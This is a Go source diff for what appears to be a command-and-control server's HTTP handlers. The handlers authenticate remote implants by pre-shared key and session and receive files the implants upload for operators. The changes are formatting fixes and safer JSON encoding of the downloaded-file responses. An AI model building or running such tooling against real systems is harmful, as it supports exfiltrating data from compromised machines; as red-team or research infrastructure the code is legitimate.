@@ -49,7 +49,7 @@ func HTTPServerHandler(w http.ResponseWriter, r *http.Request) {
 //
 // HTTP GET Requests are expected to be provided as URL parameters like any other web request. The following parameters can be provided:
 //
-// PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
+// # PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
 //
 // SessionID - a unique Session ID that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration.
 //
@@ -74,18 +74,18 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 	getParams := r.URL.Query()
 
 	var (
-		getPSK                string
-		getSessionID          int
-		getUUID               uuid.UUID
-		getImplantArch        string
-		getUpdate             float64
-		getData               string
+		getPSK                 string
+		getSessionID           int
+		getUUID                uuid.UUID
+		getImplantArch         string
+		getUpdate              float64
+		getData                string
 		getAdditionalFunctions string
-		additionalFunctions   map[string]interface{}
-		getUsername           string
-		getFileName           string
-		getFile               string
-		err                   error
+		additionalFunctions    map[string]interface{}
+		getUsername            string
+		getFileName            string
+		getFile                string
+		err                    error
 	)
 	var protocol string
 	register := false
@@ -287,11 +287,20 @@ SESSION_VALID:
 			fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " file contents was empty, no file written for: " + getFileName)
 		} else {
 			if getUsername == "server" {
-				core.DownloadFile(getFileName, getFile)
+				outputFile := core.ConsumePendingDownloadOutput(getSessionID, getFileName)
+				core.SaveDownloadedFile(getFileName, outputFile, getFile)
 			} else {
 				currentWolf := core.Wolves[getUsername]
-				jsonData := `{"filename":"` + getFileName + `","file":"` + getFile + `"}`
-				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+				fileResponse := map[string]string{"filename": getFileName, "file": getFile}
+				if outputFile := core.ConsumePendingDownloadOutput(getSessionID, getFileName); outputFile != "" {
+					fileResponse["outfile"] = outputFile
+				}
+				jsonData, err := json.Marshal(fileResponse)
+				if err != nil {
+					core.LogData("could not encode downloaded file response: " + err.Error())
+				} else {
+					core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, string(jsonData))
+				}
 			}
 		}
 	}
@@ -310,7 +319,6 @@ SESSION_VALID:
 
 	json.NewEncoder(w).Encode(response)
 
-
 	if r.TLS != nil {
 		protocol = "HTTPS"
 	} else {
@@ -327,7 +335,7 @@ SESSION_VALID:
 //
 // HTTP POST Requests are expected to be provided as standard Form based parameters in the body of the request. The following parameters can be provided:
 //
-// PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
+// # PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
 //
 // SessionID - a unique Session ID that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration.
 //
@@ -366,18 +374,18 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 	postParams := parsedValues
 
 	var (
-		postPSK                string
-		postSessionID          int
-		postUUID               uuid.UUID
-		postImplantArch        string
-		postUpdate             float64
-		postData               string
+		postPSK                 string
+		postSessionID           int
+		postUUID                uuid.UUID
+		postImplantArch         string
+		postUpdate              float64
+		postData                string
 		postAdditionalFunctions string
-		additionalFunctions    map[string]interface{}
-		postUsername           string
-		postFileName           string
-		postFile               string
-		err                    error
+		additionalFunctions     map[string]interface{}
+		postUsername            string
+		postFileName            string
+		postFile                string
+		err                     error
 	)
 	var protocol string
 	register := false
@@ -578,11 +586,20 @@ POST_SESSION_VALID:
 			fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
 		} else {
 			if postUsername == "server" {
-				core.DownloadFile(postFileName, postFile)
+				outputFile := core.ConsumePendingDownloadOutput(postSessionID, postFileName)
+				core.SaveDownloadedFile(postFileName, outputFile, postFile)
 			} else {
 				currentWolf := core.Wolves[postUsername]
-				jsonData := `{"filename":"` + postFileName + `","file":"` + postFile + `"}`
-				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+				fileResponse := map[string]string{"filename": postFileName, "file": postFile}
+				if outputFile := core.ConsumePendingDownloadOutput(postSessionID, postFileName); outputFile != "" {
+					fileResponse["outfile"] = outputFile
+				}
+				jsonData, err := json.Marshal(fileResponse)
+				if err != nil {
+					core.LogData("could not encode downloaded file response: " + err.Error())
+				} else {
+					core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, string(jsonData))
+				}
 			}
 		}
 	}
